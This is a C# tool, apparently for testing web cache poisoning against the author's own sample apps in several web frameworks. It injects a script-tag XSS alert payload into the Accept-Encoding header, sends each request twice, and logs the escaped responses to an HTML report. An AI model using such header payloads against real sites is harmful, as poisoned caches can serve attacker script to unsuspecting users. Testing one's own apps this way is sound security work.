using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace HttpCacheHelper
{
    /// <summary>
    /// This tool is an automated helper for cache poisoning testing
    /// </summary>
    public class TestTool
    {
        private static readonly bool Local = false;
        private readonly string Url_React = Local ? "http://react.localhost" : "https://react.myvenv.club";
        private readonly string Url_Razor = Local ? "http://razor.localhost" : "https://razor.myvenv.club";
        private readonly string Url_Django = Local ? "http://django.localhost" : "https://django.myvenv.club";
        private readonly string Url_Flask = Local ? "http://flask.localhost" : "https://flask.myvenv.club";
        private readonly string Url_Ruby = Local ? "http://ruby.localhost" : "https://ruby.myvenv.club";
        private readonly string Url_Laravel = Local ? "http://laravel.localhost" : "https://laravel.myvenv.club";
        private readonly string Url_Spring = Local ? "http://spring.localhost" : "https://spring.myvenv.club";
        private readonly string Url_Phoenix = Local ? "http://phoenix.localhost" : "https://phoenix.myvenv.club";
        private readonly string Url_Express = Local ? "http://express.localhost" : "https://express.myvenv.club";

        List<string> WebAppUrls => new List<string>
        {
            Url_React,
            Url_Razor,
            Url_Django,
            Url_Flask,
            Url_Ruby,
            Url_Laravel,
            Url_Spring,
            Url_Phoenix,
            Url_Express
        };

        private static readonly List<TestCase> TestCaseQueue = new List<TestCase>();
        
        public async Task Run(int cacheTimer = 20)
        {
            using StreamWriter file = new StreamWriter($"TestCase-{DateTime.Now.ToString("yyyyMMdd_hhmmss")}.html", true);

            foreach (TestCase testcase in TestCaseQueue)
            {
                Console.Write($"Running testcase: {testcase.Name}-{DateTime.Now.ToString("yyyyMMdd_hhmmss")}\n");
                await file.WriteAsync($"<!DOCTYPE html><html>");
                await file.WriteAsync($"<head></head>");
                await file.WriteAsync($"<body>");
                await file.WriteAsync($"<h2>TestCase: {testcase.Name}</h2>");
                await file.WriteAsync($"<p>Description: {testcase.Description}</p>");

                await RunTest(file, testcase);
                //Thread.Sleep(TimeSpan.FromSeconds(cacheTimer));
            }
        }

        private async Task RunTest(StreamWriter file, TestCase testCase, int iterationTimer = 2)
        {
            foreach (string appUrl in WebAppUrls)
            {
                using HttpClient httpClient = new HttpClient();

                await file.WriteAsync($"<h4>Request Headers</h4><ul>");
                httpClient.DefaultRequestHeaders.TryAddWithoutValidation($"Host", appUrl.Replace(Local ? "http://" : "https://", ""));
                foreach (KeyValuePair<string, string> header in testCase.HttpHeaders)
                {
                    httpClient.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
                    await file.WriteAsync($"<li>{header.Key}: {ConvertHtmlToReadable(header.Value)}</li>");
                }

                // Send the Get Request with Headers (2 request to verify cache poisoning)
                await httpClient.GetAsync(appUrl);
                Thread.Sleep(TimeSpan.FromSeconds(iterationTimer));
                HttpResponseMessage responseMessage = await httpClient.GetAsync(appUrl);

                await file.WriteAsync($"</ul><h4>Response Headers</h4><ul>");
                foreach (var header in responseMessage.Headers)
                {
                    await file.WriteAsync($"<li>{header.Key}: { ConvertHtmlToReadable(string.Join($",", header.Value)) }</li>");
                }

                // Write the Response Body Content
                string response = await responseMessage.Content.ReadAsStringAsync();

                await file.WriteAsync($"</ul><h4>Page Body</h4><h5>{appUrl}</h5>{ ConvertHtmlToReadable(response) }");
                await file.WriteAsync($"</body></html>");

            }
        }

        public class TestCase
        {
            public TestCase(string name, string description, Dictionary<string, string> httpHeaders)
            {
                Name = name;
                Description = description;
                HttpHeaders = httpHeaders;
            }

            public string Name { get; set; }
            public string Description { get; set; }
            public Dictionary<string, string> HttpHeaders { get; set; }
        }

        public void GenerateTestCases(string testcase = "all")
        {
            testcase = testcase.ToLower();

            if (testcase == "poisonattack01" || testcase == "all")
            {
                TestCaseQueue.Add(new TestCase(
                    name: "PoisonAttack01",
                    description: "Simple alert script (PoisonAttack01) inside the Accept-Encoding Header with default firefox headers.",
                    httpHeaders: new Dictionary<string, string>
                    {
                        { $"User-Agent", $"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" },
                        { $"Accept", $"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" },
                        { $"Accept-Language", $"en-US,en;q=0.5" },
                        { $"Accept-Encoding", $"gzip, deflate, <script> alert('PoisonAttack01') </script>" },
                        { $"Connection", $"close" },
                        { $"Upgrade-Insecure-Requests", $"1" }
                    }
                ));
                Console.WriteLine("Added poisonattack01 to TestCase Queue");
            }

            if (testcase == "test1" || testcase == "all")
            {

            }

            if (testcase == "test2" || testcase == "all")
            {

            }

            if (testcase == "test3" || testcase == "all")
            {

            }

        }

        public string ConvertHtmlToReadable(string data)
        {
            data = data.Replace("<", "&lt;");
            data = data.Replace(">", "&gt;");
            return data;
        }

    }
}
